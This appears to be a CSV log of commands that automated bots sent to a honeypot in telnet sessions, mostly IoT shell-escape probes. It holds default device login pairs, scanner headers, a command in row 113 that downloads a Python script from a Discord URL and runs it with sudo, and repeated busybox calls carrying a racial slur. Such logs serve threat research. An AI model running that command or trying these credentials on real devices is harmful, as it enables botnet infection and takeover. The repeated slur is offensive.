id,command,connection_id
1,enable,
2,system,
3,shell,
4,sh,
5,enable,
6,system,
7,shell,
8,sh,
9,enable,
10,system,
11,shell,
12,sh,
13,enable,
14,system,
15,shell,
16,sh,
17,enable,
18,system,
19,shell,
20,sh,
21,enable,
22,system,
23,shell,
24,sh,
25,enable,
26,system,
27,shell,
28,sh,
29,enable,
30,system,
31,shell,
32,sh,
33,enable,
34,system,
35,shell,
36,sh,
37,enable,
38,system,
39,shell,
40,sh,
41,root,
42,ivdev,
43,root,
44,1234qwer,
45,enable,
46,system,
47,shell,
48,sh,
49,sh,
50,shell,
51,enable,
52,system,
53,sh,
54,shell,
55,enable,
56,sh,
57,shell,
58,enable,
59,system,
60,sh,
61,shell,
62,enable,
63,system,
64,sh,
65,shell,
66,enable,
67,sh,
68,shell,
69,enable,
70,sh,
71,shell,
72,enable,
73,system,
74,sh,
75,shell,
76,enable,
77,system,
78,sh,
79,shell,
80,enable,
81,system,
82,enable,
83,system,
84,shell,
85,sh,
86,enable,
87,system,
88,shell,
89,sh,
90,enable,
91,system,
92,shell,
93,sh,
94,enable,
95,system,
96,shell,
97,sh,
98,enable,
99,system,
100,shell,
101,sh,
102,enable,
103,system,
104,shell,
105,sh,
106,enable,
107,system,
108,shell,
109,sh,
110,sh,
111,shell,
112,"ls /",
113,"sudo apt-get update -y;sudo apt-get install python3.6 -y;sudo apt-get install wget -y;sudo wget https://cdn.discordapp.com/attachments/533491609602359336/538712116970913822/cons.py ;sudo python3 cons.py",
114,enable,
115,system,
116,shell,
117,sh,
118,enable,
119,system,
120,shell,
121,sh,
122,enable,
123,system,
124,shell,
125,sh,
126,enable,
127,system,
128,shell,
129,sh,
130,enable,
131,system,
132,shell,
133,sh,
134,enable,
135,system,
136,shell,
137,sh,
138,enable,
139,system,
140,shell,
141,sh,
142,root,
143,00000000,
144,support,
145,support,
146,enable,
147,system,
148,shell,
149,sh,
150,enable,
151,system,
152,shell,
153,sh,
154,enable,
155,system,
156,shell,
157,sh,
158,enable,
159,system,
160,shell,
161,sh,
162,"User-Agent: Mozilla/5.0 zgrab/0.x",
163,"Accept: */*",
164,enable,
165,system,
166,shell,
167,sh,
168,enable,
169,system,
170,shell,
171,sh,
172,enable,
173,system,
174,shell,
175,sh,
176,enable,
177,system,
178,shell,
179,sh,
180,enable,
181,system,
182,shell,
183,sh,
184,enable,
185,system,
186,shell,
187,sh,
188,enable,
189,system,
190,shell,
191,sh,
192,enable,
193,system,
194,shell,
195,sh,
196,enable,
197,system,
198,shell,
199,sh,
200,enable,
201,system,
202,shell,
203,sh,
204,enable,
205,system,
206,shell,
207,sh,
208,enable,
209,system,
210,shell,
211,sh,
212,enable,
213,system,
214,shell,
215,sh,
216,enable,
217,system,
218,shell,
219,sh,
220,enable,
221,system,
222,shell,
223,sh,
224,enable,
225,system,
226,shell,
227,sh,
228,enable,
229,system,
230,shell,
231,sh,
232,enable,
233,system,
234,shell,
235,sh,
236,sh,
237,shell,
238,"/bin/busybox NIGGER",
239,sh,
240,shell,
241,"/bin/busybox NIGGER",
242,enable,
243,system,
244,shell,
245,sh,
246,enable,
247,system,
248,shell,
249,sh,
250,enable,
251,system,
252,shell,
253,sh,
254,sh,
255,shell,
256,"/bin/busybox NIGGER",
257,enable,
258,system,
259,shell,
260,sh,
261,enable,
262,system,
263,shell,
264,sh,
265,enable,
266,system,
267,shell,
268,sh,
269,sh,
270,shell,
271,"/bin/busybox NIGGER",
272,enable,
273,system,
274,shell,
275,sh,
276,enable,
277,system,
278,shell,
279,sh,
280,enable,
281,system,
282,shell,
283,sh,
284,enable,
285,system,
286,shell,
287,sh,
288,enable,
289,system,
290,shell,
291,sh,
292,sh,
293,shell,
294,"/bin/busybox NIGGER",
295,sh,
296,shell,
297,"/bin/busybox NIGGER",
298,enable,
299,system,
300,shell,
301,sh,
302,enable,
303,system,
304,shell,
305,sh,
306,enable,
307,system,
308,shell,
309,sh,
310,enable,
311,system,
312,shell,
313,sh,
314,enable,
315,system,
316,shell,
317,sh,
318,enable,
319,system,
320,shell,
321,sh,
322,sh,
323,shell,
324,"/bin/busybox NIGGER",
325,enable,
326,system,
327,shell,
328,sh,
329,enable,
330,system,
331,shell,
332,sh,
333,enable,
334,system,
335,shell,
336,sh,
337,enable,
338,system,
339,shell,
340,sh,
341,enable,
342,system,
343,shell,
344,sh,
345,enable,
346,system,
347,shell,
348,sh,
349,"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
350,"Accept-Encoding: gzip, deflate, br",
351,"Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
352,"Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3",
353,fox.version=s:1.0,
354,enable,
355,system,
356,shell,
357,sh,
358,enable,
359,system,
360,shell,
361,sh,
362,enable,
363,system,
364,shell,
365,sh,
366,enable,
367,system,
368,shell,
369,sh,
370,enable,
371,system,
372,shell,
373,sh,
374,enable,
375,system,
376,shell,
377,sh,
378,enable,
379,system,
380,shell,
381,sh,
382,enable,
383,system,
384,shell,
385,sh,
386,enable,
387,system,
388,shell,
389,sh,
390,enable,
391,system,
392,shell,
393,sh,
394,enable,
395,system,
396,shell,
397,sh,
398,enable,
399,system,
400,shell,
401,sh,
402,enable,
403,system,
404,shell,
405,sh,
406,enable,
407,system,
408,shell,
409,sh,
410,enable,
411,system,
412,shell,
413,sh,
414,sh,
415,shell,
416,"/bin/busybox NIGGER",
417,enable,
418,enable,
419,system,
420,system,
421,shell,
422,shell,
423,sh,
424,sh,
425,enable,
426,system,
427,shell,
428,sh,
429,enable,
430,system,
431,shell,
432,sh,
433,enable,
434,system,
435,shell,
436,sh,
437,enable,
438,system,
439,shell,
440,sh,
441,enable,
442,system,
443,shell,
444,sh,
445,enable,
446,system,
447,shell,
448,sh,
449,enable,
450,system,
451,shell,
452,sh,
453,enable,
454,system,
455,shell,
456,sh,
457,enable,
458,system,
459,shell,
460,sh,
461,enable,
462,system,
463,shell,
464,sh,
465,enable,
466,system,
467,shell,
468,sh,
469,sh,
470,shell,
471,"/bin/busybox NIGGER",
472,enable,
473,system,
474,shell,
475,sh,
476,sh,
477,shell,
478,"/bin/busybox NIGGER",
479,enable,
480,system,
481,shell,
482,sh,
483,enable,
484,system,
485,shell,
486,sh,
487,enable,
488,system,
489,shell,
490,sh,
491,sh,
492,shell,
493,sh,
494,sh,
495,shell,
496,"/bin/busybox NIGGER",
497,enable,
498,system,
499,shell,
500,sh,
501,enable,
502,system,
503,shell,
504,sh,
505,enable,
506,system,
507,shell,
508,sh,
509,enable,
510,system,
511,shell,
512,sh,
513,enable,
514,system,
515,shell,
516,sh,
517,enable,
518,system,
519,shell,
520,sh,
521,enable,
522,system,
523,shell,
524,sh,
525,enable,
526,system,
527,shell,
528,sh,
529,enable,
530,system,
531,shell,
532,sh,
533,enable,
534,system,
535,shell,
536,sh,
537,enable,
538,system,
539,shell,
540,sh,
541,sh,
542,shell,
543,"/bin/busybox NIGGER",
544,enable,
545,system,
546,shell,
547,sh,
548,enable,
549,system,
550,shell,
551,sh,
552,sh,
553,shell,
554,"/bin/busybox NIGGER",
555,enable,
556,system,
557,shell,
558,sh,
559,sh,
560,shell,
561,"/bin/busybox NIGGER",
562,enable,
563,system,
564,shell,
565,sh,
566,enable,
567,system,
568,shell,
569,sh,
570,enable,
571,system,
572,shell,
573,sh,
574,enable,
575,system,
576,shell,
577,sh,
578,enable,
579,system,
580,shell,
581,sh,
582,root,
583,7ujMko0vizxv,
584,root,
585,hunt5759,
586,enable,
587,system,
588,shell,
589,sh,
590,enable,
591,system,
592,shell,
593,sh,
594,enable,
595,system,
596,shell,
597,sh,
598,enable,
599,system,
600,shell,
601,sh,
602,sh,
603,shell,
604,"/bin/busybox NIGGER",
605,sh,
606,shell,
607,"/bin/busybox NIGGER",
608,enable,
609,system,
610,shell,
611,sh,
612,enable,
613,system,
614,shell,
615,sh,
616,enable,
617,system,
618,shell,
619,sh,
620,root,
621,dreambox,
622,admin,
623,smcadmin,
624,enable,
625,system,
626,shell,
627,sh,
628,enable,
629,system,
630,shell,
631,sh,
632,enable,
633,system,
634,shell,
635,sh,
636,enable,
637,system,
638,shell,
639,sh,
640,enable,
641,system,
642,shell,
643,sh,
644,enable,
645,system,
646,shell,
647,sh,
648,enable,
649,system,
650,shell,
651,sh,
652,sh,
653,shell,
654,"/bin/busybox NIGGER",
655,enable,
656,system,
657,shell,
658,sh,
659,enable,
660,system,
661,shell,
662,sh,
663,enable,
664,system,
665,shell,
666,sh,
667,sh,
668,shell,
669,"/bin/busybox NIGGER",
670,sh,
671,shell,
672,enable,
673,system,
674,sh,
675,shell,
676,enable,
677,sh,
678,shell,
679,enable,
680,system,
681,sh,
682,shell,
683,enable,
684,system,
685,sh,
686,shell,
687,enable,
688,system,
689,shell,
690,enable,
691,system,
692,console,
693,sh,
694,shell,
695,enable,
696,system,
697,sh,
698,shell,
699,enable,
700,system,
701,sh,
702,shell,
703,enable,
704,system,
705,sh,
706,shell,
707,enable,
708,system,
709,enable,
710,system,
711,shell,
712,sh,
713,enable,
714,system,
715,shell,
716,sh,
717,enable,
718,system,
719,shell,
720,sh,
721,enable,
722,system,
723,shell,
724,sh,
725,enable,
726,system,
727,shell,
728,sh,
729,enable,
730,system,
731,shell,
732,sh,
733,enable,
734,system,
735,shell,
736,sh,
737,enable,
738,system,
739,shell,
740,sh,
741,enable,
742,system,
743,shell,
744,sh,
745,enable,
746,system,
747,shell,
748,sh,
749,enable,
750,system,
751,shell,
752,sh,
753,enable,
